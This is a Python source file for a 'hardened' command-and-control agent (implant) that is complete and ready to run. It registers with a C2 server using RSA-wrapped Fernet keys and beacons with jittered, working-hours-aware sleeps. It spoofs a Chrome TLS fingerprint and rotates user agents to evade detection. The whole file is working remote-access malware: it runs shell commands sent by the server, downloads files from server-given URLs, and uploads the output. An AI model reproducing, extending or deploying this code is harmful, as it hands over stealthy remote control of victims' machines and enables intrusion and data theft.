"""
C2 Agent — Hardened
====================
Security model:
  - Generates a fresh Fernet session key on every startup.
  - Fetches server's RSA public key; encrypts the session key with OAEP-SHA256.
  - Registers with the server to receive a per-agent HMAC token.
  - Every subsequent request includes:
      X-Agent-Id   : agent UUID
      X-Timestamp  : Unix milliseconds
      X-Signature  : HMAC-SHA256(session_key, "{agent_id}:{timestamp_ms}")
  - All request/response bodies encrypted with the per-agent Fernet key.
  - No shared or hardcoded symmetric key exists.

Config:
  Set SERVER_URL to the C2 server address before use.
"""

import base64
import hashlib
import hmac as _hmac
import json
import random
import subprocess
import time
import uuid
from datetime import datetime

import requests
import tls_client
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding

# ---------------------------------------------------------------------------
# Configuration (edit these for your deployment)
# ---------------------------------------------------------------------------
SERVER_URL = "http://0.0.0.0:5000"

PUBKEY_ENDPOINT   = "/pub"
REGISTER_ENDPOINT = "/api/register"
BEACON_ENDPOINT   = "/api/status"
RESULT_ENDPOINT   = "/api/upload"

SLEEP_MIN = 10
SLEEP_MAX = 30

# ---------------------------------------------------------------------------
# Agent identity & session key (generated fresh each run)
# ---------------------------------------------------------------------------
AGENT_ID:    str   = str(uuid.uuid4())
SESSION_KEY: bytes = Fernet.generate_key()      # 32-byte url-safe base64
_fernet              = Fernet(SESSION_KEY)

AGENT_TOKEN: str = ""  # set during registration

# ---------------------------------------------------------------------------
# TLS client session (browser-fingerprint spoofing)
# ---------------------------------------------------------------------------
_session = tls_client.Session(client_identifier="chrome_112")

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 "
    "(KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
]
_UA = random.choice(USER_AGENTS)

# ---------------------------------------------------------------------------
# Crypto helpers
# ---------------------------------------------------------------------------

def _encrypt(data: dict) -> bytes:
    return _fernet.encrypt(json.dumps(data).encode())


def _decrypt(payload: bytes) -> dict:
    return json.loads(_fernet.decrypt(payload).decode())


def _make_signature(timestamp_ms: int) -> str:
    """HMAC-SHA256(SESSION_KEY, '{AGENT_ID}:{timestamp_ms}')"""
    return _hmac.new(
        SESSION_KEY,
        f"{AGENT_ID}:{timestamp_ms}".encode(),
        hashlib.sha256,
    ).hexdigest()


def _auth_headers() -> dict:
    ts = int(time.time() * 1000)
    return {
        "User-Agent":   _UA,
        "X-Agent-Id":   AGENT_ID,
        "X-Timestamp":  str(ts),
        "X-Signature":  _make_signature(ts),
    }

# ---------------------------------------------------------------------------
# Registration
# ---------------------------------------------------------------------------

def register() -> bool:
    """Fetch RSA pubkey, encrypt our session key, register with server."""
    global AGENT_TOKEN

    try:
        # 1. Fetch RSA public key
        resp = _session.get(SERVER_URL + PUBKEY_ENDPOINT, timeout_seconds=10)
        if resp.status_code != 200:
            print(f"[!] Could not fetch public key: {resp.status_code}")
            return False

        pub_key = serialization.load_pem_public_key(resp.content)

        # 2. RSA-OAEP encrypt our Fernet session key
        enc_session_key = pub_key.encrypt(
            SESSION_KEY,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None,
            ),
        )

        payload = {
            "agent_id":        AGENT_ID,
            "session_key_enc": base64.b64encode(enc_session_key).decode(),
            "timestamp_ms":    int(time.time() * 1000),
        }

        resp = _session.post(
            SERVER_URL + REGISTER_ENDPOINT,
            json=payload,
            headers={"User-Agent": _UA},
            timeout_seconds=10,
        )

        if resp.status_code == 200:
            AGENT_TOKEN = resp.json().get("token", "")
            print(f"[+] Registered as {AGENT_ID}")
            return True
        else:
            print(f"[!] Registration failed: {resp.status_code} {resp.text}")
            return False

    except Exception as e:
        print(f"[!] Registration error: {e}")
        return False

# ---------------------------------------------------------------------------
# Core agent loop
# ---------------------------------------------------------------------------

def beacon() -> None:
    payload = _encrypt({"id": AGENT_ID})
    try:
        response = _session.post(
            SERVER_URL + BEACON_ENDPOINT,
            data=payload,
            headers=_auth_headers(),
            timeout_seconds=10,
        )
        if response.status_code == 401:
            print("[!] Unauthorized (401) — agent decommissioned or invalid session. Exiting.")
            exit(0)

        if response.status_code == 200 and response.content:
            data = _decrypt(response.content)
            task = data.get("task")
            if task:
                execute_task(task)
    except Exception as e:
        print(f"[!] Beacon error: {e}")


def execute_task(task_data: dict) -> None:
    task_type = task_data.get("type")
    task_id   = task_data.get("task_id")
    if task_type == "shell":
        run_shell(task_data.get("command", ""), task_id)
    elif task_type == "download":
        download_file(task_data.get("url", ""), task_data.get("save_as", "tmp_dl"), task_id)
    elif task_type == "sleep":
        global SLEEP_MIN, SLEEP_MAX
        SLEEP_MIN = task_data.get("min", SLEEP_MIN)
        SLEEP_MAX = task_data.get("max", SLEEP_MAX)
    elif task_type == "shutdown":
        print("[!] Shutdown command received. Exiting.")
        exit(0)
    else:
        print(f"[-] Unknown task type: {task_type}")


def run_shell(command: str, task_id: int) -> None:
    if not command:
        return
    try:
        output = subprocess.check_output(
            command, shell=True, stderr=subprocess.STDOUT, timeout=60
        )
        post_result(output.decode(errors="replace"), task_id)
    except subprocess.CalledProcessError as e:
        post_result(e.output.decode(errors="replace"), task_id)
    except Exception as e:
        post_result(f"[!] Shell error: {e}", task_id)


def download_file(url: str, save_as: str, task_id: int) -> None:
    try:
        r = requests.get(url, stream=True, timeout=30)
        with open(save_as, "wb") as f:
            for chunk in r.iter_content(chunk_size=8192):
                f.write(chunk)
        post_result(f"[+] Downloaded {url} -> {save_as}", task_id)
    except Exception as e:
        post_result(f"[!] Download error: {e}", task_id)


def post_result(result: str, task_id: int) -> None:
    payload = _encrypt({
        "id": AGENT_ID,
        "task_id": task_id,
        "output": result
    })
    try:
        response = _session.post(
            SERVER_URL + RESULT_ENDPOINT,
            data=payload,
            headers=_auth_headers(),
            timeout_seconds=10,
        )
        if response.status_code == 401:
            print("[!] Unauthorized (401) during result upload. Exiting.")
            exit(0)
    except Exception as e:
        print(f"[!] Result post error: {e}")


def dynamic_sleep() -> int:
    hour = datetime.now().hour
    if 9 <= hour <= 17:
        return random.randint(SLEEP_MIN, SLEEP_MAX)
    return random.randint(SLEEP_MIN * 2, SLEEP_MAX * 3)


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

def main() -> None:
    # Retry registration with back-off
    for attempt in range(1, 6):
        if register():
            break
        wait = 2 ** attempt
        print(f"[!] Registration attempt {attempt} failed — retrying in {wait}s")
        time.sleep(wait)
    else:
        print("[!] All registration attempts failed — exiting.")
        return

    while True:
        beacon()
        time.sleep(dynamic_sleep())


if __name__ == "__main__":
    main()
